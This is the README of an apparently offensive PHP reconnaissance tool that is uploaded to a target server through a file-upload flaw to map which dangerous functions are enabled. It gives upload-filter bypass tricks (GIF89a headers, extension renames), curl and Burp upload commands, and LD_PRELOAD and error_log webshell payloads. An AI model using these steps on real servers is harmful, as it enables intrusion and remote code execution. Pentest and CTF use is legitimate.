# PHPFuncRecon

**Staged PHP function reconnaissance tool for penetration testers and CTF players.**

Checks 150+ dangerous functions across 12 categories, auto-detects bypass strategies, and outputs colored HTML or plain text reports. Splits into small parts to bypass upload size limits.

---

## How It Works

```
┌─────────────────────────────────────────────────────────────┐
│  Your Machine                    Target Server              │
│                                                             │
│  Upload p1.php ──────────────►  /uploads/p1.php             │
│  Visit p1.php  ──────────────►  Runs checks                │
│                                 Saves → /tmp/_audit_p1.txt  │
│                                                             │
│  Upload p2.php ──────────────►  /uploads/p2.php             │
│  Visit p2.php  ──────────────►  Runs checks                │
│                                 Saves → /tmp/_audit_p2.txt  │
│                                                             │
│  ... repeat for p3 → p6 ...                                 │
│                                                             │
│  Upload report.php ──────────►  /uploads/report.php         │
│  Visit report.php  ──────────►  Reads all /tmp/_audit_*.txt │
│                                 Assembles full report       │
│                                 Renders HTML or Text        │
│                                                             │
│  ?f=html  ← Colored HTML report                            │
│  ?f=text  ← Plain text output                              │
└─────────────────────────────────────────────────────────────┘
```

---

## Features

- **150+ functions/classes** checked across **12 categories**
- **Staged execution** — each part is under 10KB, bypasses upload size limits
- **GIF89a header** — all files start with magic bytes for upload filter bypass
- **No closures/anonymous functions** — compatible with PHP 5.x and 7.x
- **Auto bypass detection** — tells you exactly which bypass path is available
- **Ready-to-use payloads** — every available function comes with copy-paste exploit code
- **Dual output** — colored HTML report or plain text
- **Store and forward** — each part saves results to `/tmp/`, assembler collects them
- **No external dependencies** — pure PHP, no libraries needed

---

## What It Checks

| Part | File | Category | Functions |
|------|------|----------|-----------|
| 1 | `p1.php` | Server Info | 30+ settings, PHP version vulns, loaded extensions, writable dirs |
| 1 | `p1.php` | Command Execution | system, exec, shell_exec, passthru, popen, proc_open, pcntl_exec |
| 1 | `p1.php` | PHP Code Execution | eval, assert, create_function, preg_replace /e, include/require, dynamic calls |
| 2 | `p2.php` | Callback Functions | 34 callbacks — call_user_func, array_map, ob_start, usort, register_shutdown_function... |
| 3 | `p3.php` | LD_PRELOAD Bypass | putenv + mail/mb_send_mail/error_log/imap_mail/syslog/gnupg_init/libvirt_connect |
| 3 | `p3.php` | Special Bypass | imap_open (CVE-2018-19518), dl, virtual, mod_cgi, PHP-FPM, /proc/self/mem |
| 4 | `p4.php` | Filesystem Read | 26 functions — file_get_contents, scandir, glob, highlight_file, exif... |
| 4 | `p4.php` | Filesystem Write | 20 functions — file_put_contents, fwrite, error_log, copy, symlink, chmod... |
| 5 | `p5.php` | Network | fsockopen, stream_socket_client, curl_exec, dns_get_record + reverse shell recipes |
| 5 | `p5.php` | Info Disclosure | 32 functions — phpinfo, getenv, ini_get, posix_getpwuid... |
| 5 | `p5.php` | Environment | putenv, ini_set, extract, parse_str, apache_setenv |
| 5 | `p5.php` | Dangerous Misc | unserialize, header, posix_kill, posix_setuid, proc_nice... |
| 6 | `p6.php` | OOP & Classes | ReflectionFunction, Imagick, FFI, SplFileObject, DirectoryIterator, PDO... |
| 6 | `p6.php` | Bypass Strategy | Auto-detects all available bypass paths with exploitation steps |
| — | `report.php` | Assembler | Collects all parts → renders colored HTML or plain text |

---

## Quick Start

### Step 1: Upload Parts

Upload each file through the target's file upload form. All files start with `GIF89a;` for filter bypass.

```
Upload p1.php → Visit http://target/uploads/p1.php
Upload p2.php → Visit http://target/uploads/p2.php
Upload p3.php → Visit http://target/uploads/p3.php
Upload p4.php → Visit http://target/uploads/p4.php
Upload p5.php → Visit http://target/uploads/p5.php
Upload p6.php → Visit http://target/uploads/p6.php
```

Each part outputs its results AND saves them to `/tmp/_audit_pN.txt`.

### Step 2: Upload Assembler

```
Upload report.php → Visit http://target/uploads/report.php
```

### Step 3: View Report

```
http://target/uploads/report.php          ← Colored HTML (default)
http://target/uploads/report.php?f=text   ← Plain text
```

---

## Upload Tips

### Via Burp Suite

```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="p1.php"
Content-Type: image/gif

GIF89a;
<?php ... ?>
------Boundary--
```

### Via curl

```bash
# Upload all parts
for i in 1 2 3 4 5 6; do
  curl -s -F "file=@p${i}.php;filename=p${i}.php" http://target/upload.php
  curl -s http://target/uploads/p${i}.php > /dev/null
  echo "Part $i done"
done

# Upload and trigger assembler
curl -s -F "file=@report.php;filename=report.php" http://target/upload.php
curl -s http://target/uploads/report.php?f=text
```

### Extension Bypass

If `.php` is blocked, try renaming:

```
p1.php    → p1.phtml
p1.php    → p1.php5
p1.php    → p1.phar
p1.php    → p1.php.jpg  (with .htaccess trick)
```

---

## Sample Output

```
============================================================
  PHP FUNCTION CHECKER v3.0 - PART 1/6
============================================================

====== SERVER INFO ======
Server: Linux ubuntu 4.4.0-210-generic x86_64
PHP Version: 7.0.33
User: www-data
CWD: /var/www/html/uploads
Disabled: exec,passthru,shell_exec,system,proc_open,popen...
open_basedir: NONE
allow_url_fopen: 1

--- WRITABLE DIRS ---
.: [+] WRITABLE
/tmp: [+] WRITABLE

====== 1. Command Execution (OS Shell) [CRITICAL] ======
  [-] blocked  system
  [-] blocked  exec
  [-] blocked  shell_exec
  ...

====== 4. LD_PRELOAD Bypass [CRITICAL] ======
  [+] AVAILABLE  putenv
           THE critical function — sets LD_PRELOAD env variable
           Test: putenv('LD_PRELOAD=/tmp/evil.so');

  [+] AVAILABLE  mail
           Calls sendmail binary → triggers LD_PRELOAD
           Payload: putenv('LD_PRELOAD=/tmp/evil.so'); mail('a','a','a');

  ============================================
  >>> LD_PRELOAD BYPASS IS POSSIBLE!
  >>> putenv + mail / error_log / syslog
  >>>
  >>> HOW TO EXPLOIT:
  >>> 1. Compile evil.so (same arch as target)
  >>> 2. Upload evil.so to /tmp or uploads
  >>> 3. Upload PHP trigger file
  >>> 4. Visit: ?cmd=whoami
  ============================================

============================================================
  BYPASS STRATEGY SUMMARY
============================================================

[CRITICAL] 2. LD_PRELOAD Bypass
   Chain: putenv + mail / error_log / syslog
   Tool: Chankro3

[HIGH] 7. error_log File Writer
   error_log('<?php...?>',3,'/path/shell.php')

[HIGH] 9. File Read
   Functions: file_get_contents, scandir, glob, highlight_file

  Total bypass strategies found: 8
============================================================
```

---

## File Structure

```
PHPFuncRecon/
├── p1.php          # Server Info + Command Exec + Code Exec (9KB)
├── p2.php          # Callback Functions — 34 functions (5KB)
├── p3.php          # LD_PRELOAD + Special Bypass (7KB)
├── p4.php          # Filesystem Read (26) + Write (20) (8KB)
├── p5.php          # Network + Info + Environment + Misc (9KB)
├── p6.php          # OOP Classes + Bypass Strategy Summary (8KB)
├── report.php      # Assembler — HTML or Text output (8KB)
└── README.md
```

All files:
- Start with `GIF89a;` (upload filter bypass)
- Under 10KB each (bypass upload size limits)
- No anonymous functions (PHP 5.x/7.x compatible)
- Self-contained (no external dependencies)

---

## Categories Explained

### 1. Command Execution `[CRITICAL]`
Direct OS command execution. If any function is available = instant RCE.
```
system, exec, shell_exec, passthru, popen, proc_open, pcntl_exec, backticks
```

### 2. PHP Code Execution `[CRITICAL]`
Execute arbitrary PHP code internally.
```
eval, assert, create_function, preg_replace /e, mb_ereg_replace /e
include, require (LFI/RFI vectors)
Dynamic calls: $_GET['f']($_GET['a']), variable functions, octal/hex encoding
```

### 3. Callback Functions `[HIGH]`
Call dangerous functions indirectly to bypass WAF/filters.
```
call_user_func, array_map, array_filter, ob_start, usort
register_shutdown_function, set_error_handler, forward_static_call
+ 22 more array comparison/iteration callbacks
```

### 4. LD_PRELOAD Bypass `[CRITICAL]`
Bypass disable_functions via putenv(LD_PRELOAD) + execve trigger.
```
putenv (KEY) + mail, mb_send_mail, imap_mail, error_log, syslog
libvirt_connect, gnupg_init
```

### 5. Special Bypass `[CRITICAL]`
Alternative RCE paths.
```
imap_open (CVE-2018-19518), dl (load .so), virtual (Apache sub-request)
Also covers: mod_cgi, PHP-FPM, /proc/self/mem, UAF exploits
```

### 6. Filesystem Read `[HIGH]`
Read files, list directories, leak source code.
```
file_get_contents, scandir, glob, highlight_file, readfile
fopen, parse_ini_file, exif_read_data, 18 more
```

### 7. Filesystem Write `[HIGH]`
Write webshells, overwrite configs, create symlinks.
```
file_put_contents, fwrite, error_log (mode 3!), copy, symlink
rename, chmod, mkdir, unlink, image functions (hidden write!)
```

### 8. Network `[HIGH]`
Reverse shells, SSRF, data exfiltration.
```
fsockopen, stream_socket_client, curl_exec, dns_get_record
+ Reverse shell recipes when functions are available
```

### 9. Info Disclosure `[MEDIUM]`
Leak server info, configuration, users.
```
phpinfo, getenv, ini_get, php_uname, posix_getpwuid
get_loaded_extensions, get_declared_classes, 25 more
```

### 10. Environment Manipulation `[HIGH]`
Change settings, overwrite variables.
```
putenv, ini_set, extract (variable overwrite!), parse_str, apache_setenv
```

### 11. Dangerous Misc `[MEDIUM-HIGH]`
Deserialization, headers, process control.
```
unserialize (gadget chains!), header (CRLF), posix_kill, posix_setuid
```

### 12. OOP & Classes `[HIGH]`
NOT blocked by disable_functions!
```
ReflectionFunction, Imagick, FFI, SplFileObject
DirectoryIterator (open_basedir bypass!), GlobIterator, PDO, ZipArchive
```

---

## Bypass Strategy Auto-Detection

The tool automatically analyzes available functions and suggests exploitation paths:

| Priority | Strategy | Condition |
|----------|----------|-----------|
| CRITICAL | Direct RCE | Any command exec function available |
| CRITICAL | LD_PRELOAD | putenv + mail/error_log/syslog/etc |
| CRITICAL | imap_open | CVE-2018-19518 |
| CRITICAL | FFI | FFI class loaded (PHP 7.4+) |
| HIGH | Imagick | Imagick class (MVG injection) |
| HIGH | ReflectionFunction | Can invoke disabled functions |
| HIGH | error_log writer | Write webshell to any path |
| HIGH | PHP-FPM | fsockopen + fwrite |
| HIGH | File Read | Read configs, flags, source code |
| HIGH | File Write | Write webshell, symlinks |
| MEDIUM | Network | Reverse shell, SSRF, DNS exfil |

---

## Use Cases

### Pentest Engagement
```
1. Found file upload on target
2. Upload parts one by one
3. Get full function audit
4. Follow bypass strategy recommendation
5. Achieve RCE
```

### CTF Competition
```
1. Got limited PHP execution
2. Upload checker to see what's available
3. Bypass strategy tells you the intended path
4. Solve the challenge
```

### Security Audit
```
1. Deploy on client server (with permission)
2. Get full function availability report
3. Identify dangerous configurations
4. Recommend disable_functions hardening
```

---

## Recommended disable_functions

Based on findings, recommend adding these to `php.ini`:

```ini
disable_functions = exec,system,passthru,shell_exec,popen,proc_open,
pcntl_exec,putenv,mail,mb_send_mail,imap_open,imap_mail,error_log,
dl,symlink,link,call_user_func,call_user_func_array,extract,parse_str,
show_source,highlight_file,posix_kill,posix_mkfifo,posix_setpgid,
posix_setsid,posix_setuid,proc_nice,proc_terminate,apache_setenv,
fsockopen,pfsockopen,stream_socket_client,stream_socket_sendto
```

---

## Compatibility

| PHP Version | Status |
|-------------|--------|
| PHP 5.4+ | Fully compatible |
| PHP 7.0-7.4 | Fully compatible |
| PHP 8.0+ | Compatible (some deprecated function checks adjusted) |

Tested on:
- Apache + mod_php
- Nginx + PHP-FPM
- XAMPP / WAMP / MAMP

---

## Legal Disclaimer

This tool is intended for **authorized security testing only**.

- Use only on systems you have **written permission** to test
- Designed for **penetration testing engagements** and **CTF competitions**
- Always **clean up** uploaded files after testing
- The author is **not responsible** for any misuse

**Do not use this tool on systems you do not own or have explicit authorization to test.**

---

## Credits & References

- [HackTricks - PHP disable_functions bypass](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass)
- [Chankro - LD_PRELOAD bypass tool](https://github.com/TarlogicSecurity/Chankro)
- [dfunc-bypasser](https://github.com/teambi0s/dfunc-bypasser)
- [PayloadsAllTheThings - PHP](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
- [Tarlogic - disable_functions deep dive](https://www.tarlogic.com/blog/disable_functions-bypasses-php-exploitation/)

---

## License

MIT License — See [LICENSE](LICENSE) for details.

---

**Author:** Security Researcher
**Version:** 3.0
